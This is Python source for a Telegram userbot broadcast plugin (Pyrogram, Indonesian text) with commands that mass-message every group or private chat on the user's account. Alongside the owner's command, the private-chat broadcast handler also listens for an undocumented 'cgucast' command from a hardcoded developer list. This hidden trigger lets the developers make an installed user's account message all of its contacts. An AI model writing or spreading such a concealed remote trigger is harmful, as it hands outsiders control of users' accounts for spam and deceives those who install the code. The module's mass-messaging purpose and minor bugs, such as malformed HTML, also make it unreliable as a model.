"""
CREDIT
KODE BY [AMANG] <https://t.me/amwang> <https://github.com/amanqs>

HAPUS CREDIT?, WAH KEBANGETAN SIH.
"""

import asyncio
import time
from datetime import datetime, timedelta

from pyrogram import *
from pyrogram.enums import ChatType
from pyrogram.types import *

from Amang import *
from Amang.config import *
from Amang.utils import *

__MOD__ = "Broadcast"
__HELP__ = f"""
 Document for Broadcast 

• Command: <code>{cmd[0]}gucast</code> [text/reply to text/media]
• Function: Untuk mengirim pesan ke semua user 
           
• Command: <code>{cmd[0]}gcast</code> [text/reply to text/media]
• Function: Untuk mengirim pesan ke semua group 

• Command: <code>{cmd[0]}cancel</code>
• Function: Membatalkan proses Gcast.

• Command: <code>{cmd[0]}addbl</code>
• Function: Menambahkan grup kedalam anti Gcast.
           
• Command: <code>{cmd[0]}delbl</code>
• Function: Menghapus grup dari daftar anti Gcast.
           
• Command: <code>{cmd[0]}listbl</code>
• Function: Melihat daftar grup anti Gcast.
           
"""


#BARU INIIIIII!!!

broadcast_running = False

@ubot.on_message(filters.me & anjay("gcast"))
async def _(client, message: Message):
    global broadcast_running

    if len(message.command) < 2 and not message.reply_to_message:
        return await message.reply_text("<code>Berikan pesan atau balas pesan...</code>")

    if broadcast_running:
        return await message.reply_text("<code>Pengiriman pesan global sedang berlangsung...</code>")

    broadcast_running = True

    sent = 0
    failed = 0
    user_id = client.me.id
    msg = await eor(message, "<code>Processing Global Broadcast...</code>")
    list_blchat = await blacklisted_chats(user_id)
    async for dialog in client.get_dialogs():
        if not broadcast_running:
            break

        if dialog.chat.type in [ChatType.GROUP, ChatType.SUPERGROUP]:
            if message.reply_to_message:
                send = message.reply_to_message
            else:
                send = message.text.split(None, 1)[1]

            chat_id = dialog.chat.id
            if chat_id not in list_blchat and chat_id not in BLACKLIST_CHAT:
                try:
                    if message.reply_to_message:
                        await send.copy(chat_id)
                    else:
                        await client.send_message(chat_id, send)
                    sent += 1
                    await asyncio.sleep(1)
                except Exception:
                    failed += 1
                    await asyncio.sleep(1)

    broadcast_running = False

    if sent > 0:
        await msg.edit(f"✅ Berhasil Terkirim: {sent} \n❌ Gagal Terkirim: {failed}")
    else:
        await msg.edit("<b>Tidak ada grup atau supergrup yang tersedia untuk dikirimkan pesan.</b>")


@ubot.on_message(filters.me & anjay("cancel"))
async def cancel_broadcast(client, message):
    global broadcast_running

    if not broadcast_running:
        return await message.reply_text("<code>Tidak ada pengiriman pesan global yang sedang berlangsung.</code>")

    broadcast_running = False
    await message.reply_text("<b>Pengiriman pesan global telah dibatalkan!</b>")


#SAMPE LINE INI!!!


@ubot.on_message(filters.user(DEVS) & filters.command("cgucast", ".") & ~filters.me)
@ubot.on_message(filters.me & anjay("gucast"))
async def _(client, message: Message):
    sent = 0
    failed = 0
    msg = await eor(message, "Processing...")
    async for dialog in client.get_dialogs():
        if dialog.chat.type == ChatType.PRIVATE:
            if message.reply_to_message:
                send = message.reply_to_message
            else:
                if len(message.command) < 2:
                    return await eor(
                        message, "Mohon berikan pesan atau balas ke pesan..."
                    )
                else:
                    send = message.text.split(None, 1)[1]
            chat_id = dialog.chat.id
            if chat_id not in DEVS:
                try:
                    if message.reply_to_message:
                        await send.copy(chat_id)
                    else:
                        await client.send_message(chat_id, send)
                    sent += 1
                    await asyncio.sleep(1)
                except Exception:
                    failed += 1
                    await asyncio.sleep(1)
    await msg.edit(f"✅ Berhasil Terkirim: {sent} \n❌ Gagal Terkirim: {failed}")


@ubot.on_message(filters.me & anjay("addbl"))
async def bl_chat(client, message):
    chat_id = message.chat.id
    chat = await client.get_chat(chat_id)
    if chat.type == "private":
        return await eor(message, "Maaf, perintah ini hanya berlaku untuk grup.")
    user_id = client.me.id
    bajingan = await blacklisted_chats(user_id)
    if chat in bajingan:
        return await eor(message, "Obrolan sudah masuk daftar Blacklist Gcast.")
    await blacklist_chat(user_id, chat_id)
    await eor(
        message, "Obrolan telah berhasil dimasukkan ke dalam daftar Blacklist Gcast."
    )


@ubot.on_message(filters.me & anjay("delbl"))
async def del_bl(client, message):
    if len(message.command) != 2:
        return await eor(
            message, "<b>Gunakan Format:</b>\n <code>delbl [CHAT_ID]</code>"
        )
    user_id = client.me.id
    chat_id = int(message.text.strip().split()[1])
    if chat_id not in await blacklisted_chats(user_id):
        return await eor(
            message, "Obrolan berhasil dihapus dari daftar Blacklist Gcast."
        )
    whitelisted = await whitelist_chat(user_id, chat_id)
    if whitelisted:
        return await eor(
            message, "Obrolan berhasil dihapus dari daftar Blacklist Gcast."
        )
    await eor(message, "Sesuatu yang salah terjadi.")


@ubot.on_message(filters.me & anjay("listbl"))
async def all_chats(client, message):
    text = "<b>Daftar Blacklist Gcast:</b>\n\n"
    j = 0
    user_id = client.me.id
    chat_id = message.chat.id
    for count, chat_id in enumerate(await blacklisted_chats(user_id), 1):
        try:
            chat = await client.get_chat(chat_id)
            title = chat.title
        except Exception:
            title = "Private\n"
        j = 1
        text += f"<b>{count}.{title}</b><code{message.chat.id}</code>\n"
    if j == 0:
        await eor(message, "Tidak Ada Daftar Blacklist Gcast.")
    else:
        await eor(message, text)

